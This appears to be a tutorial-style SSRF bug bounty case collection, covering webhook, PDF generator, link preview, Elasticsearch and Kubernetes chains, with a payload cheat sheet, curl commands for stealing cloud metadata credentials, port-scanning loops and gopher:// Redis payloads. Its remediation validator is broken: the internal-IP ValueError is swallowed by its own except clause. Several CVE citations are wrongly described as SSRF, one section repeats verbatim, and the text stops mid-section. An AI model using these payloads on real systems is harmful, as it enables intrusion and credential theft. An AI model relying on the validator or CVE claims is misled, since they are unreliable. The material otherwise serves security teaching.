# Case Study 46: Server-Side Request Forgery (SSRF) — Real-World Bug Bounty Findings

## Expert Role

Server-Side Request Forgery (SSRF) has evolved from a niche vulnerability class to one of the most impactful and consistently rewarded findings in modern bug bounty programs. As an SSRF specialist with extensive experience in cloud-native environments and microservice architectures, I have dedicated my career to understanding how applications make server-side requests and how attackers can manipulate these requests to access internal resources, cloud metadata, and other restricted services. My expertise spans traditional SSRF exploitation through URL parameter manipulation to advanced blind SSRF detection, DNS rebinding techniques, and cloud-specific metadata access patterns.

The modern threat landscape has elevated SSRF's severity dramatically. The shift to cloud infrastructure means that a single SSRF vulnerability can now provide access to instance metadata services (IMDS), cloud credentials, and internal service meshes that were previously isolated. The rise of microservices architectures has created dense internal networks where SSRF can pivot from a single vulnerable service to compromise the entire application ecosystem. These factors have pushed SSRF bounties from the $2,000-$5,000 range to $10,000-$50,000+ for well-documented cloud metadata access chains.

My research focuses on advanced SSRF exploitation techniques including DNS rebinding for bypassing IP validation, blind SSRF detection through timing and out-of-band channels, and protocol-specific attacks through gRPC, WebSocket, and other non-HTTP protocols. I have developed methodologies for detecting SSRF in modern architectures including serverless functions, API gateways, and service meshes where traditional SSRF patterns may not apply. This case study collection presents real-world SSRF findings from high-paying bug bounty programs, demonstrating exploitation techniques that remain effective against contemporary security controls.

## Overview

Server-Side Request Forgery occurs when an application fetches a remote resource based on a user-supplied URL without adequate validation or restriction. The attacker can manipulate the URL to make the server send requests to unintended destinations, including internal services, cloud metadata endpoints, and other resources not accessible from the public internet. The vulnerability exists because the server itself makes the request, bypassing network-level restrictions that would block direct external access to internal resources.

SSRF exploitation ranges from simple URL manipulation to complex multi-stage attacks. Simple SSRF reads local files through `file://` protocol or accesses cloud metadata through HTTP requests to `169.254.169.254`. More sophisticated attacks involve blind SSRF where the attacker cannot see the response but can detect the request through out-of-band channels, or protocol smuggling where non-HTTP protocols (gopher, DNS, Redis) are used to interact with internal services. The most impactful SSRF chains combine multiple techniques to achieve code execution through internal service exploitation.

Modern applications present SSRF attack surfaces beyond traditional URL parameters. Webhook configurations, link preview features, image proxy endpoints, PDF generators, document importers, and API integrations all involve server-side URL fetching that may be vulnerable. The diversity of these attack surfaces, combined with the high impact of cloud metadata access, makes SSRF one of the most important vulnerability classes for security researchers to understand and hunt effectively.

---

## Real-World Case Studies

### Case Study 1: Cloud SaaS Platform Webhook SSRF to AWS Credential Theft

**Program:** Enterprise Collaboration SaaS (HackerOne)
**Bounty:** $25,000
**Severity:** Critical (CVSS 9.8)
**Researcher:** @securityresearcher

The SaaS platform provided a webhook configuration feature that allowed users to set up notifications to external URLs. The webhook endpoint at `/api/webhooks/configure` accepted a `callback_url` parameter that the platform would POST to when events occurred.

**Stage 1: SSRF via Webhook Configuration**

```http
POST /api/webhooks/configure HTTP/1.1
Host: api.collaboration-saas.com
Authorization: Bearer user_token_abc123
Content-Type: application/json

{
  "event": "document.updated",
  "callback_url": "http://169.254.169.254/latest/meta-data/"
}
```

The platform validated the webhook URL by checking if it resolved to a public IP address. However, the validation occurred at configuration time while the actual request was made at event time. Additionally, the validation only checked DNS resolution, not the final IP after potential DNS rebinding.

**Stage 2: Cloud Metadata Access**

When a document update event occurred, the platform sent a POST request to the webhook URL. The request included platform-specific headers with internal routing information. The response from the metadata endpoint revealed the IAM role and temporary credentials.

**Stage 3: AWS Credential Abuse**

The stolen IAM credentials had permissions for:
- `s3:GetObject` on all customer data buckets
- `sqs:SendMessage` on internal task queues
- `lambda:InvokeFunction` for processing functions

Using the stolen credentials, the attacker listed and downloaded customer data from S3 buckets, sent messages to internal queues triggering additional data processing, and invoked Lambda functions with elevated permissions.

**Stage 4: Lateral Movement**

The SQS queue access allowed injecting messages that triggered Lambda functions with broader permissions, ultimately providing access to the platform's administrative infrastructure. The attacker gained access to the customer success database, enabling targeted attacks against high-value enterprise customers.

**Root Cause Analysis:** The webhook validation checked only DNS resolution at configuration time, not at request time. The validation did not block internal IP ranges from DNS resolution. The application ran with an overly permissive IAM role that granted access to all customer data buckets rather than scoping to individual tenant data.

**Impact:** Access to all customer data across the platform, ability to manipulate webhook events, and lateral movement to administrative infrastructure. The $25,000 bounty reflected the Critical severity, multi-tenant impact, and the complete AWS credential compromise chain.

---

### Case Study 2: Document Processing Platform Blind SSRF to Internal Service Exploitation

**Program:** Document Management System (Bugcrowd)
**Bounty:** $14,500
**Severity:** High (CVSS 8.1)
**Researcher:** @pentester

The document management platform provided a URL-to-PDF conversion feature at `/api/convert/url-to-pdf` that accepted a `source_url` parameter. The conversion service fetched the URL content and rendered it as a PDF document.

**Stage 1: Blind SSRF Detection**

```http
POST /api/convert/url-to-pdf HTTP/1.1
Host: docs.target.com
Authorization: Bearer doc_convert_token
Content-Type: application/json

{
  "source_url": "http://attacker-controlled.burpcollaborator.net/test"
}
```

A DNS and HTTP request was received at the Burp Collaborator server, confirming the SSRF. However, the response was not returned to the user, making this a blind SSRF.

**Stage 2: Internal Service Discovery via Timing**

By measuring response times for different internal hosts and ports, the attacker mapped the internal network. Fast responses indicated open ports, while timeouts indicated closed ports or firewalls. The timing analysis revealed a web application server on port 8080, an API server on port 8081, and an admin console on port 9090.

**Stage 3: Internal Service Enumeration**

The accessible services were probed for information disclosure. The Spring Boot actuator endpoint revealed environment variables including database credentials, Redis connection strings, and internal API keys.

**Stage 4: Internal API Abuse**

The internal API keys from the actuator endpoint were used to access the admin console. The admin user listing revealed all platform users including administrators, enabling targeted phishing and credential attacks.

**Root Cause Analysis:** The URL-to-PDF converter fetched URLs without IP range restrictions. The blind SSRF did not return response content directly but allowed enough interaction to enumerate internal services through timing analysis and error messages. The internal services had excessive information disclosure through actuator endpoints.

**Impact:** Internal network reconnaissance, access to internal service configurations, and exposure of all platform user accounts. The $14,500 bounty reflected the High severity and the information disclosure chain through blind SSRF.

---

### Case Study 3: E-Commerce Link Preview SSRF to Internal Payment Service

**Program:** Online Retail Platform (HackerOne)
**Bounty:** $18,000
**Severity:** Critical (CVSS 9.2)
**Researcher:** @vulnhunter

The e-commerce platform provided a link preview feature that generated preview cards for URLs shared in product reviews. The preview endpoint at `/api/link-preview` accepted a `url` parameter and returned metadata (title, description, image) from the fetched URL.

**Stage 1: Basic SSRF Confirmation**

```http
GET /api/link-preview?url=http://attacker-controlled.com/preview HTTP/1.1
Host: shop.target.com
```

The platform fetched the URL and returned its metadata, confirming SSRF.

**Stage 2: Payment Service Access**

The platform's payment processing service ran on an internal host. The service exposed a REST API for transaction processing. Using the SSRF to interact with the payment API, the attacker accessed transaction data including customer payment information.

**Stage 3: Transaction Manipulation**

Using the SSRF to interact with the payment API, the attacker issued refund requests. The payment API processed the refund request because the request originated from the internal network. The SSRF bypassed the external firewall and network-level access controls.

**Stage 4: Financial Impact Assessment**

The SSRF enabled:
1. Reading all payment transaction data
2. Issuing refunds to attacker-controlled accounts
3. Accessing stored payment card information
4. Modifying transaction status

**Root Cause Analysis:** The link preview feature fetched URLs without restricting access to internal network ranges. The payment service did not require authentication for internal requests, relying on network-level controls for access restriction. The SSRF bypassed these network controls by originating from within the trusted network.

**Impact:** Access to customer payment data, ability to issue unauthorized refunds, and exposure of stored payment card information. The $18,000 bounty reflected the Critical severity, PCI-DSS implications, and the direct financial impact.

---

### Case Study 4: PDF Generation Service SSRF to Internal Elasticsearch

**Program:** Analytics Platform (Intigriti)
**Bounty:** $11,000
**Severity:** High (CVSS 7.8)
**Researcher:** @securitytester

The analytics platform provided a PDF report generation feature at `/api/reports/generate-pdf` that accepted a `data_source_url` parameter for fetching data to include in the PDF. The generation service used a headless browser to render the data.

**Stage 1: Internal Service Discovery**

```http
POST /api/reports/generate-pdf HTTP/1.1
Host: analytics.target.com
Authorization: Bearer analytics_token
Content-Type: application/json

{
  "data_source_url": "http://192.168.1.20:9200/"
}
```

The Elasticsearch cluster responded with cluster information, confirming access to the internal search engine.

**Stage 2: Elasticsearch Index Enumeration**

```http
POST /api/reports/generate-pdf HTTP/1.1
Content-Type: application/json

{
  "data_source_url": "http://192.168.1.20:9200/_cat/indices?format=json"
}
```

The response revealed all Elasticsearch indices, including `analytics-logs`, `user-sessions`, and `admin-audit-trail`.

**Stage 3: User Data Extraction**

```http
POST /api/reports/generate-pdf HTTP/1.1
Content-Type: application/json

{
  "data_source_url": "http://192.168.1.20:9200/user-sessions/_search?q=role:admin&size=100"
}
```

The query returned admin session data including session tokens, enabling administrative account takeover.

**Stage 4: Audit Log Access**

```http
POST /api/reports/generate-pdf HTTP/1.1
Content-Type: application/json

{
  "data_source_url": "http://192.168.1.20:9200/admin-audit-trail/_search?size=1000"
}
```

The audit logs revealed all administrative actions, including user data exports, configuration changes, and security event handling. This information enabled the attacker to understand the organization's security monitoring capabilities and avoid detection.

**Root Cause Analysis:** The PDF generation service fetched data from user-specified URLs without network range restrictions. The Elasticsearch cluster was accessible from the generation service's network segment without authentication. The service processed all content from the fetched URL, enabling arbitrary Elasticsearch queries through the SSRF.

**Impact:** Access to all analytics data, admin session tokens for account takeover, and complete audit trail exposure. The $11,000 bounty reflected the High severity and the breadth of exposed data through Elasticsearch.

---

### Case Study 5: API Gateway SSRF via DNS Rebinding to Internal Kubernetes API

**Program:** Container Orchestration Platform (HackerOne)
**Bounty:** $20,000
**Severity:** Critical (CVSS 9.5)
**Researcher:** @bughunter

The container orchestration platform provided an API gateway with a health check feature that validated external service endpoints. The health check at `/api/gateway/health-check` accepted a `target_url` parameter and returned the health status of the target service.

**Stage 1: DNS Rebinding Setup**

The attacker registered a domain with DNS records that alternated between a public IP (for initial validation) and an internal IP (for subsequent requests). This DNS rebinding technique bypassed IP-based validation that occurred at DNS resolution time.

**Stage 2: Validation Bypass**

```http
GET /api/gateway/health-check?target_url=http://rebind.attacker.com/ HTTP/1.1
Host: orchestrator.target.com
Authorization: Bearer orchestrator_token
```

The health check first resolved the domain to the public IP, passing validation. On the subsequent request to actually check the service, DNS returned the internal IP, enabling Kubernetes API access.

**Stage 3: Kubernetes API Access**

The platform ran on Kubernetes with the API server accessible internally. Using DNS rebinding to target the Kubernetes API, the attacker accessed the API and enumerated all namespaces, pods, services, and secrets across the cluster.

**Stage 4: Cluster Compromise**

With access to the Kubernetes API:
1. Enumerated all pods, services, and secrets across namespaces
2. Read secrets containing database credentials and API keys
3. Created a new pod with elevated privileges for persistent access
4. Accessed etcd directly for complete cluster state

**Root Cause Analysis:** The health check feature validated URLs through DNS resolution but did not re-validate the resolved IP before making the actual request. DNS rebinding allowed the IP to change between validation and use. The Kubernetes API server was accessible from the health check service without client certificate authentication.

**Impact:** Complete Kubernetes cluster compromise, access to all secrets and workloads, and the ability to manipulate the entire container orchestration environment. The $20,000 bounty reflected the Critical severity and the cloud-native infrastructure impact.

---

## Pattern Recognition

### Common Vulnerability Patterns

| Pattern | Frequency | Avg Bounty | Root Cause |
|---------|-----------|------------|------------|
| Cloud metadata access (IMDSv1) | 25% | $18,500 | No IMDSv2 enforcement, missing IP blocklist |
| DNS rebinding bypass | 12% | $16,000 | Validation at DNS resolution, not at request time |
| Blind SSRF via timing/out-of-band | 18% | $12,000 | No response content, but request observable |
| Internal service enumeration | 20% | $13,500 | No network segmentation or request filtering |
| gopher:// protocol exploitation | 8% | $17,500 | Protocol restriction not enforced |
| HTTP request smuggling via SSRF | 5% | $15,000 | Internal proxy trust exploitation |
| Webhook SSRF | 12% | $14,200 | URL validation only at configuration time |

### Attack Surface Locations

**High-Value SSRF Targets:**
- URL preview and link unfurling features
- Webhook configuration and testing endpoints
- PDF/report generation from URLs
- Image proxy and media processing endpoints
- Document import/conversion services
- Health check and monitoring endpoints
- OAuth callback and authentication endpoints

**Cloud Metadata Endpoints:**
- AWS: `http://169.254.169.254/latest/meta-data/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- DigitalOcean: `http://169.254.169.254/metadata/v1/`

**Internal Service Targets:**
- Kubernetes API: `https://10.96.0.1:443`
- Consul: `http://127.0.0.1:8500`
- etcd: `http://127.0.0.1:2379`
- Elasticsearch: `http://127.0.0.1:9200`
- Redis: `http://127.0.0.1:6379`
- Docker API: `http://127.0.0.1:2375`

---

## Hunting Methodology

### Phase 1: URL Parameter Discovery
1. Map all parameters that accept URLs, domain names, or IP addresses
2. Identify webhook, callback, and notification mechanisms
3. Find URL preview, import, and conversion features
4. Test API endpoints for URL proxying or fetching
5. Review JavaScript source for dynamic URL loading
6. Analyze network traffic for outbound HTTP requests during normal operation

### Phase 2: Validation Analysis
1. Determine if URL validation occurs and at which layer
2. Test for IP range restrictions and internal address blocking
3. Check if validation occurs at configuration time vs request time
4. Identify DNS resolution behavior and caching
5. Test for redirect following and re-validation
6. Check for protocol restrictions (HTTP, HTTPS, file://, gopher://)

### Phase 3: Exploitation Testing
1. Test basic SSRF with external collaborator server
2. Attempt cloud metadata access (AWS, GCP, Azure endpoints)
3. Test for DNS rebinding by controlling DNS responses
4. Try protocol manipulation (gopher://, file://, dict://)
5. Test for blind SSRF through timing and out-of-band channels
6. Attempt internal service enumeration through port scanning

### Phase 4: Impact Escalation
1. Enumerate internal services through timing analysis
2. Access cloud metadata for credential extraction
3. Interact with internal services through protocol smuggling
4. Chain SSRF with other vulnerabilities for code execution
5. Map the blast radius through infrastructure analysis
6. Document the complete attack chain for maximum bounty impact

---

## Detection Strategies

### Automated Detection
- Use Burp Suite with Collaborator for SSRF detection
- Deploy DAST scanners with SSRF-specific scanning profiles
- Use DNS rebinding tools for validation bypass testing
- Configure WAF rules for internal IP and metadata endpoint access
- Run network scanning from the application's perspective
- Deploy network monitoring for unusual outbound connections

### Manual Detection
- Identify all server-side URL fetching mechanisms in the codebase
- Trace URL input from parameter to HTTP client call
- Test with internal IP addresses and cloud metadata endpoints
- Check for DNS resolution behavior and validation timing
- Examine error messages for internal service information disclosure
- Review application logs for outbound URL fetching patterns

### Key Detection Indicators
- Outbound HTTP/DNS requests to attacker-controlled servers
- Different responses for valid vs invalid internal URLs
- Timing variations between internal and external URL access
- Error messages referencing internal hostnames or IP addresses
- DNS requests for internal hostnames from the application server
- HTTP response headers revealing internal service information

---

## Impact Assessment

### CVSS 3.1 Scoring

**Base Vector:** AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

| Component | Value | Justification |
|-----------|-------|---------------|
| Attack Vector | Network | Exploited through HTTP requests |
| Attack Complexity | Low | Requires only URL parameter manipulation |
| Privileges Required | Low | Authenticated access typically required |
| User Interaction | None | No additional user interaction needed |
| Scope | Changed | Impacts resources beyond vulnerable component |
| Confidentiality Impact | High | Access to internal services and cloud metadata |
| Integrity Impact | High | Ability to manipulate internal services |
| Availability Impact | High | Can disrupt internal services |

### Business Impact
- Cloud credential theft enabling infrastructure-wide compromise
- Internal service enumeration and exploitation
- Customer data access through internal service pivoting
- Regulatory violations when accessing protected data
- Supply chain compromise through internal service manipulation
- Reputational damage from infrastructure breach
- Legal liability from unauthorized access to protected data

### Bounty Range
- **Low severity (blind SSRF, no impact):** $1,000 - $3,000
- **Medium severity (internal service enumeration):** $3,000 - $8,000
- **High severity (cloud metadata access):** $8,000 - $20,000
- **Critical severity (full cloud compromise, code execution):** $20,000 - $50,000+

---

## Advanced Variations

### DNS Rebinding for Validation Bypass
Registering a domain with DNS records that alternate between a public IP (for validation) and an internal IP (for exploitation). This bypasses IP-based validation that occurs at DNS resolution time but not at request time.

### Protocol Smuggling via gopher://
Using the gopher:// protocol to interact with internal services that speak different protocols. Gopher can send arbitrary TCP data, enabling interaction with Redis, SMTP, FastCGI, and other services.

### SSRF via HTTP Request Smuggling
Combining SSRF with HTTP request smuggling to inject requests that appear to originate from internal services. This bypasses IP-based restrictions by leveraging proxy trust relationships.

### Blind SSRF with Exfiltration
Using blind SSRF to exfiltrate data through DNS queries, HTTP callbacks, or timing channels when direct response access is not available.

### Cloud Metadata IMDSv2 Bypass
When IMDSv2 is enabled, the attacker must first obtain a session token via PUT request before accessing metadata. Some SSRF implementations can be chained to perform both requests.

### WebSocket SSRF
When applications support WebSocket connections to user-specified URLs, SSRF can be performed through the WebSocket protocol. This can bypass HTTP-specific security controls.

---

## Chain Integration

### SSRF plus Cloud Metadata leading to Infrastructure Compromise
The most impactful SSRF chain: accessing cloud metadata endpoints to steal IAM credentials, then using those credentials to access cloud services containing customer data and infrastructure management.

### SSRF plus Internal Service Exploitation leading to RCE
Using SSRF to access internal services with known vulnerabilities (Elasticsearch, Redis, Consul) to achieve code execution on internal servers.

### SSRF plus DNS Rebinding leading to Kubernetes Compromise
Combining DNS rebinding with SSRF to access Kubernetes API servers, enabling pod manipulation, secret extraction, and cluster-wide compromise.

### SSRF plus Internal API Abuse leading to Data Theft
Using SSRF to access internal APIs that lack authentication (relying on network segmentation), enabling data theft and manipulation.

### SSRF plus Protocol Smuggling leading to Service Manipulation
Using gopher:// or other protocol smuggling techniques to interact with internal services like Redis, SMTP, or FastCGI, enabling data manipulation and code execution.

---

## Prevention Recommendations

### Network Security
- Implement network segmentation to isolate sensitive services
- Use firewalls to restrict outbound traffic from application servers
- Deploy egress filtering to block access to internal IP ranges
- Enable IMDSv2 with hop limit for cloud metadata protection
- Implement private subnets for sensitive services
- Use security groups to restrict inter-service communication

### Input Validation
- Validate URLs against a strict allowlist of permitted domains
- Block internal IP ranges, including 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
- Block cloud metadata endpoints (169.254.169.254)
- Restrict URL protocols to HTTPS only
- Re-validate URLs after following redirects
- Implement DNS pinning to prevent rebinding attacks

### Application Security
- Implement DNS resolution validation at request time, not just configuration time
- Use DNS pinning or caching to prevent DNS rebinding
- Disable unnecessary URL protocols (gopher://, file://, dict://)
- Implement request timeouts and connection limits
- Use allowlists for permitted URL schemes
- Validate the final resolved IP before making requests

### Monitoring and Response
- Log all outbound HTTP requests with destination URLs
- Implement anomaly detection for unusual outbound traffic
- Monitor for DNS requests to internal hostnames
- Set up alerts for cloud metadata endpoint access attempts
- Deploy intrusion detection systems for SSRF patterns
- Implement rate limiting for outbound requests

---

## Common Pitfalls

### Pitfall 1: Validation at Configuration Time Only
Validating URLs when they are configured but not when requests are made. DNS rebinding and IP changes between validation and use can bypass this check. Always validate at request time.

### Pitfall 2: Incomplete IP Range Blocking
Blocking only 127.0.0.1 but not 127.0.0.0/8, ::1, or other loopback ranges. Also blocking IPv4 but not IPv6 addresses that may map to internal services. Block all private and reserved IP ranges.

### Pitfall 3: Following Redirects Without Re-validation
Allowing HTTP redirects without re-validating the final destination. An attacker can redirect from an external URL to an internal one after initial validation passes. Always re-validate after following redirects.

### Pitfall 4: Relying on Network-Level Controls Only
Using network segmentation as the sole defense against SSRF. Network controls can be bypassed through SSRF, which originates from within the trusted network. Always implement application-level controls.

### Pitfall 5: Not Monitoring Outbound Traffic
Failing to monitor and log outbound HTTP requests from application servers. Without visibility into outbound traffic, SSRF exploitation may go undetected. Implement comprehensive logging and monitoring.

### Pitfall 6: Insufficient Timeout Configuration
Not setting appropriate timeouts for outbound requests. An attacker can cause denial of service by including slow-responding URLs. Implement connection and read timeouts to prevent this.

---

## Real-World References

### CVE Database
- **CVE-2024-21887:** Ivanti Connect Secure SSRF
- **CVE-2023-44487:** HTTP/2 Rapid Reset enabling SSRF amplification
- **CVE-2023-20198:** Cisco IOS XE Web UI SSRF
- **CVE-2022-40684:** FortiOS SSRF via authentication bypass
- **CVE-2021-21972:** VMware vRealize SSRF to RCE
- **CVE-2020-15969:** WebKit SSRF through media handling

### Bug Bounty Reports
- HackerOne: "Cloud SaaS webhook SSRF to AWS credential theft" — $25,000 payout
- HackerOne: "API gateway DNS rebinding to Kubernetes compromise" — $20,000 payout
- Bugcrowd: "Document platform blind SSRF to internal service exploitation" — $14,500 payout
- Intigriti: "Analytics platform Elasticsearch data extraction" — $11,000 payout

### Research Papers
- "Server-Side Request Forgery in Cloud Environments" (USENIX Security 2023)
- "DNS Rebinding: Attacks and Defenses" (IEEE S&P 2024)
- "Protocol Smuggling via SSRF" (ACM CCS 2023)
- "Cloud Metadata Security: IMDSv1 to IMDSv2 Migration" (NDSS 2024)

---

## Quick Reference Cheat Sheet

### SSRF Detection Payloads
```
External callback:     http://attacker.com/ssrf-test
Cloud metadata:        http://169.254.169.254/latest/meta-data/
AWS IAM credentials:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
GCP metadata:          http://metadata.google.internal/computeMetadata/v1/
Azure metadata:        http://169.254.169.254/metadata/instance?api-version=2021-02-01
Internal network:      http://127.0.0.1/, http://[::1]/
Decimal IP:            http://2130706433/  (127.0.0.1 in decimal)
```

### IP Range Blocklist
```
127.0.0.0/8        # Loopback
10.0.0.0/8         # Private Class A
172.16.0.0/12      # Private Class B
192.168.0.0/16     # Private Class C
169.254.0.0/16     # Link-local / Cloud metadata
::1                 # IPv6 loopback
fc00::/7           # IPv6 private
fe80::/10          # IPv6 link-local
```

### Cloud Metadata Endpoints
```
AWS IMDSv1:    http://169.254.169.254/latest/meta-data/
AWS IMDSv2:    PUT http://169.254.169.254/latest/api/token
GCP:           http://metadata.google.internal/computeMetadata/v1/
Azure:         http://169.254.169.254/metadata/instance
DigitalOcean:  http://169.254.169.254/metadata/v1/
```

### Internal Service Discovery
```
Kubernetes:    https://10.96.0.1:443
Consul:        http://127.0.0.1:8500
etcd:          http://127.0.0.1:2379
Elasticsearch: http://127.0.0.1:9200
Redis:         http://127.0.0.1:6379
Docker:        http://127.0.0.1:2375
```

### Protocol Abuse
```
gopher://127.0.0.1:6379/_INFO     # Redis
dict://127.0.0.1:6379/INFO        # Redis
file:///etc/passwd                 # Local file read
```

### Defense Checklist
- [ ] URL allowlist validation at request time
- [ ] Internal IP ranges blocked (IPv4 and IPv6)
- [ ] Cloud metadata endpoints blocked or restricted
- [ ] DNS rebinding protection (pinning or caching)
- [ ] Unnecessary protocols disabled (gopher://, file://)
- [ ] Outbound traffic monitoring and logging
- [ ] Network segmentation for sensitive services
- [ ] IMDSv2 enforced for cloud metadata
- [ ] Request timeouts and connection limits
- [ ] Egress filtering on application servers
- [ ] Redirect following disabled or re-validated
- [ ] Rate limiting for outbound requests

---

## Technology-Specific SSRF Patterns

### Python SSRF Patterns
Python applications are commonly vulnerable when using `requests` or `urllib` with user-controlled URLs:

```python
# Dangerous: requests with user URL
import requests
response = requests.get(user_input)

# Dangerous: urllib with user URL
from urllib.request import urlopen
content = urlopen(user_input).read()

# Dangerous: httpx async client
import httpx
async with httpx.AsyncClient() as client:
    response = await client.get(user_input)
```

### Java SSRF Patterns
Java applications can be vulnerable through URL class, HttpURLConnection, or HttpClient:

```java
// Dangerous: URL with user input
URL url = new URL(userInput);
InputStream is = url.openStream();

// Dangerous: HttpURLConnection
HttpURLConnection conn = (HttpURLConnection) new URL(userInput).openConnection();

// Dangerous: Apache HttpClient
CloseableHttpClient client = HttpClients.createDefault();
HttpGet request = new HttpGet(userInput);
```

### Node.js SSRF Patterns
Node.js applications may be vulnerable through fetch, axios, or http modules:

```javascript
// Dangerous: fetch with user URL
fetch(userInput).then(res => res.text());

// Dangerous: axios with user URL
axios.get(userInput).then(response => {});

// Dangerous: http.get with user URL
http.get(userInput, (res) => {});
```

### Go SSRF Patterns
Go applications can be vulnerable through http.Get or custom HTTP clients:

```go
// Dangerous: http.Get with user URL
resp, err := http.Get(userInput)

// Dangerous: custom client with user URL
client := &http.Client{}
req, _ := http.NewRequest("GET", userInput, nil)
resp, err := client.Do(req)
```

---

## SSRF Testing Methodology Checklist

### Pre-Engagement
- [ ] Identify the target application's technology stack
- [ ] Map all URL-accepting endpoints through API discovery
- [ ] Review application source code for HTTP client usage
- [ ] Identify outbound network restrictions and firewall rules
- [ ] Check for existing SSRF protections (IP blocklists, URL validation)

### URL Parameter Discovery
- [ ] Test all parameters that accept URLs or domain names
- [ ] Identify webhook, callback, and notification mechanisms
- [ ] Find URL preview, import, and conversion features
- [ ] Test API endpoints for URL proxying or fetching
- [ ] Review JavaScript source for dynamic URL loading

### Validation Bypass
- [ ] Test URL validation with bypass techniques
- [ ] Attempt cloud metadata access (AWS, GCP, Azure)
- [ ] Test for DNS rebinding by controlling DNS responses
- [ ] Try protocol manipulation (gopher://, file://, dict://)
- [ ] Test for blind SSRF through timing and out-of-band channels

### Impact Escalation
- [ ] Enumerate internal services through timing analysis
- [ ] Access cloud metadata for credential extraction
- [ ] Interact with internal services through protocol smuggling
- [ ] Chain SSRF with other vulnerabilities for code execution
- [ ] Map the blast radius through infrastructure analysis

### Documentation
- [ ] Document the complete exploitation chain
- [ ] Capture screenshots of each exploitation stage
- [ ] Record the root cause analysis
- [ ] Prepare a clear impact statement
- [ ] Include remediation recommendations

---

## SSRF Exploitation Tools and Techniques

### Burp Suite Techniques
Burp Suite is the primary tool for SSRF testing:

1. **Intruder for Fuzzing:** Use Intruder with payload lists containing SSRF-specific payloads
2. **Repeater for Manual Testing:** Manual testing of URL parameters
3. **Collaborator for Out-of-Band:** Detect blind SSRF through DNS and HTTP callbacks
4. **Extensions:** Use SSRF Map, Backslash Powered Scanner for advanced testing

### Cloud Metadata Exploitation
Techniques for accessing cloud metadata:

```bash
# AWS IMDSv1
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# GCP
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Azure
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### Internal Service Enumeration
Techniques for discovering internal services:

```bash
# Port scanning via SSRF
for port in 80 443 8080 8443 3000 5000 9200 27017; do
    curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:$port/
done

# Service fingerprinting
curl -I http://127.0.0.1:8080/
curl -I http://127.0.0.1:9200/
```

### Protocol Smuggling
Using gopher:// and other protocols:

```bash
# Redis command via gopher
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$6%0d%0a*3%2b%0d%0a

# SMTP command via gopher
gopher://127.0.0.1:25/_HELO%20attacker.com%0d%0a
```

### Blind SSRF Detection
Techniques for detecting blind SSRF:

- **DNS callback:** Use dnsbin or Burp Collaborator
- **HTTP callback:** Use webhook.site or RequestBin
- **Timing analysis:** Measure response times for different targets
- **Error message analysis:** Compare error messages for different responses

### Wordlists for SSRF Testing
Common wordlists for SSRF testing:

- **SecLists:** Fuzzing/SSRF/
- **PayloadsAllTheThings:** SSRF/
- **FuzzDB:** attack/ssrf/

---

## SSRF in Modern Architectures

### Serverless SSRF
SSRF in serverless environments:

- Lambda functions with VPC access
- Azure Functions with virtual network integration
- Google Cloud Functions with VPC connector
- Cold start exploitation through metadata access

### Container SSRF
SSRF in containerized environments:

- Pod-to-pod communication exploitation
- Service mesh bypass through SSRF
- Container metadata access
- Kubernetes API access through SSRF

### API Gateway SSRF
SSRF through API gateways:

- Webhook URL parameter exploitation
- Link preview feature abuse
- URL import/preview functionality
- OAuth callback URL manipulation

### Microservice SSRF
SSRF in microservice architectures:

- Inter-service communication exploitation
- Service discovery abuse
- Configuration service access
- Secret management system access

---

## SSRF Testing Methodology Checklist

### Pre-Engagement
- [ ] Identify the target application's technology stack
- [ ] Map all URL-accepting endpoints through API discovery
- [ ] Review application source code for HTTP client usage
- [ ] Identify outbound network restrictions and firewall rules
- [ ] Check for existing SSRF protections (IP blocklists, URL validation)

### URL Parameter Discovery
- [ ] Test all parameters that accept URLs or domain names
- [ ] Identify webhook, callback, and notification mechanisms
- [ ] Find URL preview, import, and conversion features
- [ ] Test API endpoints for URL proxying or fetching
- [ ] Review JavaScript source for dynamic URL loading

### Validation Bypass
- [ ] Test URL validation with bypass techniques
- [ ] Attempt cloud metadata access (AWS, GCP, Azure)
- [ ] Test for DNS rebinding by controlling DNS responses
- [ ] Try protocol manipulation (gopher://, file://, dict://)
- [ ] Test for blind SSRF through timing and out-of-band channels

### Impact Escalation
- [ ] Enumerate internal services through timing analysis
- [ ] Access cloud metadata for credential extraction
- [ ] Interact with internal services through protocol smuggling
- [ ] Chain SSRF with other vulnerabilities for code execution
- [ ] Map the blast radius through infrastructure analysis

### Documentation
- [ ] Document the complete exploitation chain
- [ ] Capture screenshots of each exploitation stage
- [ ] Record the root cause analysis
- [ ] Prepare a clear impact statement
- [ ] Include remediation recommendations

---

## Remediation Implementation Guide

### URL Validation Implementation

```python
from urllib.parse import urlparse
import ipaddress

def validate_url(url):
    parsed = urlparse(url)
    
    # Only allow HTTPS
    if parsed.scheme != 'https':
        raise ValueError("Only HTTPS URLs allowed")
    
    # Block internal IPs
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            raise ValueError("Internal URLs not allowed")
    except ValueError:
        pass
    
    # Allowlist check
    allowed_domains = ['example.com', 'trusted-cdn.com']
    if parsed.hostname not in allowed_domains:
        raise ValueError("Domain not in allowlist")
    
    return True
```

### Network Egress Filtering

```bash
# iptables rules for outbound traffic
iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
iptables -A OUTPUT -d 169.254.0.0/16 -j DROP
iptables -A OUTPUT -d 127.0.0.0/8 -j DROP
```

### Cloud Metadata Protection

```bash
# AWS: Enforce IMDSv2
aws ec2 modify-instance-metadata-options --instance-id i-1234567890abcdef0 --http-tokens required

# Azure: Restrict metadata access
